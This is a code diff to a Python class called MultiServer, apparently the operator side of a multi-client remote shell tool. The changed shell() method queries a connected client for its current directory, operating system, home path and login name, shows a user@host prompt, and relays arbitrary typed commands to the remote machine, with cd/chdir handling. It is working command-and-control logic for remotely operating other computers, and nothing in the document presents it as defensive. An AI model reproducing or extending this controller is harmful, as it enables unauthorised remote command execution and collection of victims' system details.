@@ -306,17 +306,43 @@ class MultiServer(object):
 
     def shell(self, conn):
         """ Remote Shell with Client """
-        self.send(conn, json_dumps(['cd']))
+        self.send(conn, json_dumps(['<GETCWD>']))
         cwd = self.receive(conn, _print=False).decode()
         command = ''
+        self.send(conn, json_dumps(['<INFO>']))
+        info = json.loads(self.receive(conn, _print=False).decode())
+        system = info[0] # platform.system()
+        home = info[1] # os.path.expanduser('~')
+        login = info[2] # os.getlogin()
+        hostname = self.all_addresses[self.all_connections.index(conn)][-1]
 
         while 1:
-            command = input('{}>'.format(cwd))
+            if not system == 'Windows':
+                cwd = cwd.replace(home, '~')
+                _input = '{0}@{1}:{2} $ '.format(login, hostname, cwd)
+            else:
+                _input = '{0}>'.format(cwd)
+
+            command = input(_input)
             if command == 'quit':
                 break
-            if command[:2].lower() == 'cd':
+            if command.lower() == 'cd':
                 self.send(conn, json_dumps([command]))
-                cwd = self.receive(conn, _print=False).decode()
+                self.receive(conn)
+                if system == 'Windows':
+                    print()
+                continue
+            if command[:2].lower() == 'cd' or command[:5].lower() == 'chdir':
+                self.send(conn, json_dumps([command]))
+                cwd = json.loads(self.receive(conn, _print=False).decode())
+                if cwd[0] == '<ERROR>':
+                    print(cwd[1])
+                    self.send(conn, json_dumps(['<GETCWD>']))
+                    cwd = self.receive(conn, _print=False).decode()
+                else:
+                    cwd = cwd[0]
+                    if system == 'Windows':
+                        print()
                 continue
             self.send(conn, json_dumps([command]))
             try:
